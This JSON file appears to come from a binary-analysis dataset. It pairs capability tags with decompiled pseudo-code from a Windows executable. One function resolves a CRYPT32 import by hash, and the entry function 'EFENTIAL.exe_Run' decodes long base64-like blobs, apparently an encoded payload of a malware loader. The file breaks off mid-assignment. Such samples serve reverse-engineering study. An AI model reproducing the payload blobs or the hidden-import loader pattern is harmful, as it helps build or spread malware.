{
    "0040101e": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t fcn.0040101e(uint param_1, int32_t *param_2, int32_t param_3, uint param_4)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint unaff_ESI;\n    int32_t *piVar6;\n    \n    if (param_3 == 0) {\n        return in_EAX & 0xffffff00;\n    }\n    uVar1 = fcn.00401271(L\"CRYPT32.DLL\", 0x224a2dc8);\n    pcVar2 = fcn.0040100a(uVar1);\n    piVar6 = param_2;\n    iVar3 = (*pcVar2)(param_3, param_4, 1, 0, param_2, 0, 0);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    puVar4 = fcn.0040b8de(*param_2 + 1);\n    *piVar6 = puVar4;\n    if (puVar4 == NULL) {\n        return 0;\n    }\n    iVar3 = *param_2;\n    for (uVar5 = iVar3 + 1U >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    for (uVar5 = iVar3 + 1U & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    uVar5 = (*pcVar2)(param_3, unaff_ESI, 1, *piVar6, param_2, 0, 0);\n    return uVar5 & 0xffffff00 | uVar5 != 0;\n}\n",
        "token_count": 454
    },
    "00401082": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401082(int32_t param_1, uint *param_2, uint32_t param_3, uint param_4)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    uVar4 = *(param_1 + 0x18);\n    if (uVar4 < 0x10) {\n        puVar1 = param_1 + 4;\n    }\n    else {\n        puVar1 = *(param_1 + 4);\n    }\n    if (puVar1 <= param_2) {\n        puVar1 = param_1 + 4;\n        puVar3 = puVar1;\n        if (0xf < uVar4) {\n            puVar3 = *puVar1;\n        }\n        if (param_2 < *(param_1 + 0x14) + puVar3) {\n            if (0xf < uVar4) {\n                puVar1 = *puVar1;\n            }\n            iVar2 = fcn.004011db(param_1, param_2 - puVar1, param_3);\n            return iVar2;\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.00408d91();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.0040113b(param_3, *(param_1 + 0x14), unaff_EBP, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, \n                     param_3, param_4);\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (*(param_1 + 0x18) < 0x10) {\n            *(param_1 + 4) = 0;\n            return param_1;\n        }\n        **(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            puVar1 = param_1 + 4;\n        }\n        else {\n            puVar1 = *(param_1 + 4);\n        }\n        for (uVar4 = param_3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = *param_2;\n            param_2 = param_2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n        for (uVar4 = param_3 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = *param_2;\n            param_2 = param_2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n        *(param_1 + 0x14) = param_3;\n        if (0xf < *(param_1 + 0x18)) {\n            *(*(param_1 + 4) + param_3) = 0;\n            return param_1;\n        }\n        *(param_1 + 4 + param_3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 782
    },
    "0040113b": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040113b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint32_t var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x41f6b0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar4 = var_8h | 0xf;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = *(in_ECX + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_8h = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= -uVar3 - 2)) {\n            var_8h = uVar3 + uVar1;\n        }\n    }\n    var_4h = 0;\n    puVar2 = fcn.00408bd1(var_8h + 1);\n    if (var_ch != 0) {\n        if (*(in_ECX + 0x18) < 0x10) {\n            puVar5 = in_ECX + 4;\n        }\n        else {\n            puVar5 = *(in_ECX + 4);\n        }\n        puVar6 = puVar2;\n        for (uVar4 = var_ch >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        for (uVar4 = var_ch & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    if (0xf < *(in_ECX + 0x18)) {\n        fcn.0040b0dd(*(in_ECX + 4));\n    }\n    puVar5 = in_ECX + 4;\n    *puVar5 = 0;\n    *puVar5 = puVar2;\n    *(in_ECX + 0x18) = var_8h;\n    *(in_ECX + 0x14) = var_ch;\n    if (0xf < var_8h) {\n        puVar5 = puVar2;\n    }\n    *(puVar5 + var_ch) = 0;\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 721
    },
    "00401145": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00401145(int32_t param_1, uint32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint *puVar4;\n    uint *puVar5;\n    uint unaff_retaddr;\n    char cVar6;\n    \n    if (param_2 == 0xffffffff) {\n        fcn.00408d91();\n    }\n    uVar2 = *(param_1 + 0x18);\n    if (param_2 <= uVar2) {\n        if ((cVar6 != '\\0') && (param_2 < 0x10)) {\n            uVar3 = *(param_1 + 0x14);\n            if (param_2 < *(param_1 + 0x14)) {\n                uVar3 = param_2;\n            }\n            if (0xf < uVar2) {\n                puVar1 = *(param_1 + 4);\n                if (uVar3 != 0) {\n                    puVar4 = puVar1;\n                    puVar5 = param_1 + 4;\n                    for (uVar2 = uVar3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                    for (uVar2 = uVar3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                }\n                fcn.0040b0dd(puVar1);\n            }\n            *(param_1 + 0x14) = uVar3;\n            *(param_1 + 0x18) = 0xf;\n            *(uVar3 + 4 + param_1) = 0;\n            return param_2 != 0;\n        }\n        if (param_2 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (0xf < uVar2) {\n                **(param_1 + 4) = 0;\n                return false;\n            }\n            *(param_1 + 4) = 0;\n        }\n        return param_2 != 0;\n    }\n    fcn.0040113b(param_2, *(param_1 + 0x14), unaff_ESI, unaff_EBP, unaff_retaddr, param_2, param_3, param_4, param_5, \n                 param_6);\n    return param_2 != 0;\n}\n",
        "token_count": 653
    },
    "00401163": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401163(int32_t param_1, uint *param_2, uint32_t param_3, uint param_4)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    uVar1 = *(param_1 + 0x18);\n    if (uVar1 < 8) {\n        puVar2 = param_1 + 4;\n    }\n    else {\n        puVar2 = *(param_1 + 4);\n    }\n    if (puVar2 <= param_2) {\n        puVar2 = param_1 + 4;\n        puVar4 = puVar2;\n        if (7 < uVar1) {\n            puVar4 = *puVar2;\n        }\n        if (param_2 < puVar4 + *(param_1 + 0x14) * 2) {\n            if (7 < uVar1) {\n                puVar2 = *puVar2;\n            }\n            iVar3 = fcn.00401230(param_1, param_2 - puVar2 >> 1, param_3);\n            return iVar3;\n        }\n    }\n    if (0x7ffffffe < param_3) {\n        fcn.00408d91();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.0040123f(param_3, *(param_1 + 0x14), unaff_EBP, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, \n                     param_3, param_4);\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (*(param_1 + 0x18) < 8) {\n            *(param_1 + 4) = 0;\n            return param_1;\n        }\n        **(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        if (*(param_1 + 0x18) < 8) {\n            puVar2 = param_1 + 4;\n        }\n        else {\n            puVar2 = *(param_1 + 4);\n        }\n        uVar1 = param_3 * 2;\n        for (uVar5 = uVar1 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar2 = *param_2;\n            param_2 = param_2 + 1;\n            puVar2 = puVar2 + 1;\n        }\n        for (uVar5 = uVar1 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar2 = *param_2;\n            param_2 = param_2 + 1;\n            puVar2 = puVar2 + 1;\n        }\n        *(param_1 + 0x14) = param_3;\n        if (7 < *(param_1 + 0x18)) {\n            *(uVar1 + *(param_1 + 4)) = 0;\n            return param_1;\n        }\n        *(uVar1 + param_1 + 4) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 800
    },
    "00401168": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401168(int32_t param_1, char param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((param_2 != '\\0') && (0xf < *(param_1 + 0x18))) {\n        puVar1 = *(param_1 + 4);\n        if (param_3 != 0) {\n            puVar3 = puVar1;\n            puVar4 = param_1 + 4;\n            for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        fcn.0040b0dd(puVar1);\n    }\n    *(param_1 + 0x14) = param_3;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4 + param_3) = 0;\n    return;\n}\n",
        "token_count": 343
    },
    "null": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint sym.EFENTIAL.exe_Run(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    uint unaff_EBX;\n    uint32_t unaff_EBP;\n    uint unaff_ESI;\n    uint32_t unaff_EDI;\n    uint *puVar7;\n    uchar *puStack1276;\n    uchar *puStack1272;\n    char *pcStack1268;\n    uchar *puStack1264;\n    uchar *puStack1260;\n    char *pcStack1256;\n    uchar *puStack1252;\n    uchar *puStack1248;\n    char *pcStack1244;\n    uchar *puStack1240;\n    uchar *puStack1236;\n    char *pcStack1232;\n    uchar *puStack1228;\n    uchar *puStack1224;\n    char *pcStack1220;\n    uchar *puStack1216;\n    uchar *puStack1212;\n    char *pcStack1208;\n    uchar *puStack1204;\n    uchar *puStack1200;\n    char *pcStack1196;\n    uchar *puStack1192;\n    uchar *puStack1188;\n    char *pcStack1184;\n    uchar *puStack1180;\n    uchar *puStack1176;\n    char *pcStack1172;\n    uchar *puStack1168;\n    uchar *puStack1164;\n    char *pcStack1160;\n    uchar *puStack1156;\n    uchar *puStack1152;\n    char *pcStack1148;\n    uchar *puStack1144;\n    uchar *puStack1140;\n    char *pcStack1136;\n    uchar *puStack1132;\n    uchar *puStack1128;\n    char *pcStack1124;\n    uchar *puStack1120;\n    uchar *puStack1116;\n    char *pcStack1112;\n    uchar *puStack1108;\n    uchar *puStack1104;\n    char *pcStack1100;\n    uchar *puStack1096;\n    uchar *puStack1092;\n    char *pcStack1088;\n    uchar *puStack1084;\n    uchar *puStack1080;\n    char *pcStack1076;\n    uchar *puStack1072;\n    uchar *puStack1068;\n    char *pcStack1064;\n    uchar *puStack1060;\n    uchar *puStack1056;\n    char *pcStack1052;\n    uchar *puStack1048;\n    uchar *puStack1044;\n    char *pcStack1040;\n    uchar *puStack1036;\n    uchar *puStack1032;\n    char *pcStack1028;\n    uchar *puStack1024;\n    uchar *puStack1020;\n    char *pcStack1016;\n    uchar *puStack1012;\n    uchar *puStack1008;\n    char *pcStack1004;\n    uchar *puStack1000;\n    uchar *puStack996;\n    char *pcStack992;\n    uchar *puStack988;\n    uchar *puStack984;\n    char *pcStack980;\n    uchar *puStack976;\n    uchar *puStack972;\n    char *pcStack968;\n    uchar *puStack964;\n    uchar *puStack960;\n    char *pcStack956;\n    uchar *puStack952;\n    uchar *puStack948;\n    char *pcStack944;\n    uchar *puStack940;\n    uchar *puStack936;\n    char *pcStack932;\n    uchar *puStack928;\n    uchar *puStack924;\n    char *pcStack920;\n    uchar *puStack916;\n    uchar *puStack912;\n    char *pcStack908;\n    uchar *puStack904;\n    uchar *puStack900;\n    char *pcStack896;\n    uchar *puStack892;\n    uchar *puStack888;\n    char *pcStack884;\n    uchar *puStack880;\n    uchar *puStack876;\n    char *pcStack872;\n    uchar *puStack868;\n    uchar *puStack864;\n    char *pcStack860;\n    uchar *puStack856;\n    uchar *puStack852;\n    char *pcStack848;\n    uchar *puStack844;\n    uchar *puStack840;\n    char *pcStack836;\n    uchar *puStack832;\n    uchar *puStack828;\n    char *pcStack824;\n    uchar *puStack820;\n    uchar *puStack816;\n    char *pcStack812;\n    uchar *puStack808;\n    uchar *puStack804;\n    char *pcStack800;\n    uchar *puStack796;\n    uchar *puStack792;\n    char *pcStack788;\n    uchar *puStack784;\n    uchar *puStack780;\n    char *pcStack776;\n    uchar *puStack772;\n    uchar *puStack768;\n    char *pcStack764;\n    uchar *puStack760;\n    uchar *puStack756;\n    char *pcStack752;\n    uchar *puStack748;\n    uchar *puStack744;\n    char *pcStack740;\n    uchar *puStack736;\n    uchar *puStack732;\n    char *pcStack728;\n    uchar *puStack724;\n    uchar *puStack720;\n    char *pcStack716;\n    uchar *puStack712;\n    uchar *puStack708;\n    char *pcStack704;\n    uchar *puStack700;\n    uchar *puStack696;\n    char *pcStack692;\n    uchar *puStack688;\n    uchar *puStack684;\n    char *pcStack680;\n    uchar *puStack676;\n    uchar *puStack672;\n    char *pcStack668;\n    uchar *puStack664;\n    uchar *puStack660;\n    char *pcStack656;\n    uchar *puStack652;\n    uchar *puStack648;\n    char *pcStack644;\n    uchar *puStack640;\n    uchar *puStack636;\n    char *pcStack632;\n    uchar *puStack628;\n    uchar *puStack624;\n    char *pcStack620;\n    uchar *puStack616;\n    uchar *puStack612;\n    char *pcStack608;\n    uchar *puStack604;\n    uchar *puStack600;\n    char *pcStack596;\n    uchar *puStack592;\n    uchar *puStack588;\n    char *pcStack584;\n    uchar *puStack580;\n    uchar *puStack576;\n    char *pcStack572;\n    uchar *puStack568;\n    uchar *puStack564;\n    char *pcStack560;\n    uchar *puStack556;\n    uchar *puStack552;\n    char *pcStack548;\n    uchar *puStack544;\n    uchar *puStack540;\n    char *pcStack536;\n    uchar *puStack532;\n    uchar *puStack528;\n    char *pcStack524;\n    uchar *puStack520;\n    uchar *puStack516;\n    char *pcStack512;\n    uchar *puStack508;\n    uchar *puStack504;\n    char *pcStack500;\n    uchar *puStack496;\n    uchar *puStack492;\n    char *pcStack488;\n    uchar *puStack484;\n    uchar *puStack480;\n    char *pcStack476;\n    uchar *puStack472;\n    uchar *puStack468;\n    char *pcStack464;\n    uchar *puStack460;\n    uchar *puStack456;\n    char *pcStack452;\n    uchar *puStack448;\n    uchar *puStack444;\n    char *pcStack440;\n    uchar *puStack436;\n    uchar *puStack432;\n    char *pcStack428;\n    uchar *puStack424;\n    uchar *puStack420;\n    char *pcStack416;\n    uchar *puStack412;\n    uchar *puStack408;\n    char *pcStack404;\n    uchar *puStack400;\n    uchar *puStack396;\n    char *pcStack392;\n    uchar *puStack388;\n    uchar *puStack384;\n    char *pcStack380;\n    uchar *puStack376;\n    uchar *puStack372;\n    char *pcStack368;\n    uchar *puStack364;\n    uchar *puStack360;\n    char *pcStack356;\n    uchar *puStack352;\n    uchar *puStack348;\n    char *pcStack344;\n    uchar *puStack340;\n    uchar *puStack336;\n    char *pcStack332;\n    uchar *puStack328;\n    uchar *puStack324;\n    char *pcStack320;\n    uchar *puStack316;\n    uchar *puStack312;\n    char *pcStack308;\n    uchar *puStack304;\n    uchar *puStack300;\n    char *pcStack296;\n    uchar *puStack292;\n    uchar *puStack288;\n    char *pcStack284;\n    uchar *puStack280;\n    uchar *puStack276;\n    char *pcStack272;\n    uchar *puStack268;\n    uchar *puStack264;\n    char *pcStack260;\n    uchar *puStack256;\n    uchar *puStack252;\n    char *pcStack248;\n    uchar *puStack244;\n    uchar *puStack240;\n    char *pcStack236;\n    uchar *puStack232;\n    uchar *puStack228;\n    char *pcStack224;\n    uchar *puStack220;\n    uchar *puStack216;\n    char *pcStack212;\n    uchar *puStack208;\n    uchar *puStack204;\n    char *pcStack200;\n    uchar *puStack196;\n    uchar *puStack192;\n    char *pcStack188;\n    uchar *puStack184;\n    uchar *puStack180;\n    char *pcStack176;\n    uchar *puStack172;\n    uchar *puStack168;\n    char *pcStack164;\n    uchar *puStack160;\n    uchar *puStack156;\n    char *pcStack152;\n    uchar *puStack148;\n    uchar *puStack144;\n    char *pcStack140;\n    uchar *puStack136;\n    uchar *puStack132;\n    char *pcStack128;\n    uchar *puStack124;\n    uchar *puStack120;\n    char *pcStack116;\n    uchar *puStack112;\n    uchar *puStack108;\n    char *pcStack104;\n    uchar *puStack100;\n    uchar *puStack96;\n    char *pcStack92;\n    char *pcStack88;\n    uint uVar8;\n    uint32_t in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint32_t in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint in_stack_ffffffd8;\n    uint32_t uVar9;\n    uint in_stack_ffffffdc;\n    uchar auStack32 [4];\n    uint32_t uStack28;\n    uint32_t uStack8;\n    \n    pcStack88 = 0x405e85;\n    fcn.0040117c(0x442798, 0x4230c8, unaff_EDI, unaff_ESI, unaff_EBX, in_stack_ffffffc0, in_stack_ffffffc4, \n                 in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, in_stack_ffffffd4, in_stack_ffffffd8, \n                 in_stack_ffffffdc);\n    fcn.004011fe();\n    fcn.0040119a();\n    pcStack92 = &stack0xffffffe0;\n    pcStack88 = 0x2b0;\n    puStack96 = 0x405eac;\n    iVar2 = fcn.004011a9();\n    if (*(iVar2 + 0x18) < 8) {\n        iVar2 = iVar2 + 4;\n    }\n    else {\n        iVar2 = *(iVar2 + 4);\n    }\n    pcStack88 = 0x405ec9;\n    fcn.0040b685(iVar2);\n    pcStack88 = NULL;\n    pcStack92 = 0x405ed3;\n    pcStack88 = fcn.0040124e();\n    pcStack92 = 0x405edc;\n    pcVar3 = fcn.0040100a();\n    if (7 < uStack8) {\n        pcStack88 = 0x405ef3;\n        fcn.0040b0dd();\n    }\n    uVar8 = 800;\n    pcStack88 = \n    \"YOA4sLX0kW/hJuX4dGWbik+oWPip+JCI4B2w4IizUPXCzij8DBjg+HRnnKRnK7TYK5y0kIih/Jeu52vl4/srWgw+5Ph0XRFHptDR1IzkeJyMGLBZ0ERrVTzoPIwMGuT4dF1IUS5r03hAApOIiKEfUdR0sfSRgPBA5xzgQUfkxiUt7HygQCaTiIiTaGvMxGQ7zZAbVG1gxOj12wj1pKgsl5s4eTCLGLBYxOE4sNOVX6iR8ha/TOUtWKsfD5anT9ecDcrEwgWvHLN9L2Go5JfhjXHnH4hPq1vRrMNWh8/oMyGgY9KxwE+V6MAosAenbxyUnCMHwCWobwXA50cywOP2s3aP0o8mJyGN445c2KSYWJD7kpB3XZPHtAM4s/SR8CtlbVjE7P83a3At9HyI6HHUrKydRpS/a1SU2SdEiPA/CLbxCSypL29z1Iykq0D7FzMZtJI9M0ySbqkiHuATcG5bOKbpG9ItDuVfA0SU+IdXf7a6G1e4YdyUwPcjdLNrIyS09HPBcMCTgeNba1FMtluR6MBAZRUA69K2LKoa1isVkf19k/TE1GP5mDBsbXlvYMTo/1PYsKSoW2MhjLScA168ZUiURbN2/Of4wDxrlmRvoDuiq7OTa3HUrNSbzeCIlHc7wYg4J+yZKYxqnUQ745RXJ2Fz1LDwM/zYmGt8iKkhHCRvGNj7sw9UO+Go21Cq+1PY3+dmac3gu3WxJ1yIuJ8g/P2gfOwn1ViQ3UEb/KwMO6aoY/6kPNg8uGHclX//mHygL0Nz/5x7LyyIGLDgh2SSsLWskztEHOD4\"\n    ;\n    uVar9 = 0;\n    pcStack92 = 0x405f19;\n    fcn.00401082();\n    pcStack92 = \n    \"dzfR5ID01dqsc5EBxDykZUjvvD21rBgn1pGYAHcX1fKsebcZ7Nyw/OhysmtQujcHvuN+JyV6IRB4gttIrtxe9isAk/2DmVEfh+A4sZmd84uCJ6TcUJFJMUVXV5Coc1VJYAjW4YzR07/Tl9rZ7p0BB3vkWNalhGmTcn1v/TmT7MSQa2yU6SdUiPAf8XEgwAQ97qzTkSG0tJwN2L9l/x/HTz7QPLzrq6f+e1MXpCFoVxQf+JCIA2yUvAWPBLNc5JvRCBxpvFDAVzYwqFiQI7WQu1paOyFJCCWTdyfJbQ4CYxp1JbGvIWgtiC0q5Y/iEO6KiQs92rHycq5h1bj3MBSznCF6LYctMeWM4ghb9Q0yTbswZWy0Wpzg+HQPSTVt3V36iKZ7gOJYNSnQ731APuEYJyIR4Pp05NlRpKhYlKe8VgN4lfTEoLCz9V3659kIHyOoi7B8jCFoVxREBG93A1yUxAslEDV1o53+G+MfcwPMMrDOqDJvqwtv3KwkgyDIsGjjSnqb0MB84IwIZyfMpNwuG+eAk0MDWahlSJRSM8y4GNiAl4nY/518s08rPLT0+JNzDdjEsQOVOLNGn8qjWhohMnnniPYk1qeQ3Qmp3Kx4xPYDpBzsNmkc7Gfb4nEwwASL5bAqQEPnnz+fm0of/Pez8alTbIiM45TcHGlcIC+sQJNrB0DR0ZNzv9a9YzNx5NsvCAyEWUTkWLD3/Q4b6PTHAcQ8qGv47NE6tawYJ6Is0zH/unQ7kiEctLxz0rQDdKCYAYwcoDBBbMEl9/DLi2GDxLsjNLS8cpSn\"\n    ;\n    puStack96 = &stack0xffffffbc;\n    puStack100 = &stack0xffffffd8;\n    pcStack104 = 0x405f2d;\n    puStack100 = fcn.00401091();\n    pcStack92 = 0xffffffff;\n    puStack96 = NULL;\n    pcStack104 = 0x405f3d;\n    fcn.004011db();\n    if (0xf < uStack28) {\n        puStack108 = 0x405f54;\n        fcn.0040b0dd();\n    }\n    pcStack104 = \n    \"SdG93OnvhnDJr5ttBB8ov08fKlkvxHyAI7y6qLvDO5yi+DtyPNA8uGHjlMn/zGtPp0LbUKxx1KyUFw6liCH3vbZUXSyZ4+CNhGlcv5/sfIjc2BvMrATz29TELMJ6J060Yc7vfR8bp0+XaAfO9aMTTJjbO5Ss8LP0o4iVqLwTV/RkbxymuCVcGCP8gItK82ut0nA4s7WsGKjkHOAHi+RYCKSoWJCo+JDIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DhgtawYovum7vjA7ZWRHKkUXYms+OH7OMCS54dK0diMe82Kco+MVIY9kNbdNrDBlrDMx0uQjeeEXZ64oRKI5Bzg+HTkWHWuh6kRw7kyCeNZEmHjoZo4pn66Lo9dQnkfpPowz+n6HJFmMgjjWRJssUGaM97tulD2uEJdH6X6TLY3+hDDuTLa4XvYYeOhmrC1rBis5BzgqDHkWPylrVh57mrNiIgYsOCI4DhQta4Zp+UQ4Pi05Fiw6qhYkKj4kMY2GLDgmOA4sGWsGKzkXOD4ZORYsKaoWJao+JCIiBiw5ojgOLC1rBispB3g+HDkWLCkqFiSqLgQiIgIsOCY4DiwtbwYrPQc4Ph05FigpKhYkKj4kIiIGLA0UuA4mLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLCFrRhY5xzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sGWsGKTkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBiC\"\n    ;\n    puStack108 = &stack0xffffffb0;\n    puStack112 = &stack0xffffffcc;\n    pcStack116 = 0x405f6b;\n    puStack112 = fcn.00401091();\n    pcStack104 = 0xffffffff;\n    puStack108 = NULL;\n    pcStack116 = 0x405f7b;\n    fcn.004011db();\n    if (0xf < uVar9) {\n        puStack120 = 0x405f8b;\n        fcn.0040b0dd();\n    }\n    pcStack116 = \n    \"kHmYjHTkWMgaqFiQuPiQiEgYsOCM4DiwtawYrOQc4Ph05FiQpKg4vtqc8fzpGLDOg+A4sGWsGKzoHOD4sORYsKSoWJCo+JCIiBiwoIjgeJ7RzWzN5BzgGE7kWLBEqFiQuPiQiFgYsOCI4DiwtawYrOQc4Lh05Jie5/oMkKj4kIyIGLDgqOE4sLesGKwEHOD4dORYsKSoWJCo+JDIiBjwzvqFVN/WrBhY5xzg+ETlWLCgqFiQSviQiIgYsOCI4DiwtawY7OQcovh05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORY5S9E2Xyg+pCIBZVIHXcfgri3rBj6s/QI/HTkPjOZaEzR\"\n    ;\n    puStack120 = &stack0xffffffa4;\n    puStack124 = &stack0xffffffc0;\n    pcStack128 = 0x405fa2;\n    puStack124 = fcn.00401091();\n    pcStack116 = 0xffffffff;\n    puStack120 = NULL;\n    pcStack128 = 0x405fb2;\n    fcn.004011db();\n    if (0xf < in_stack_ffffffcc) {\n        puStack132 = 0x405fc2;\n        fcn.0040b0dd();\n    }\n    pcStack128 = \n    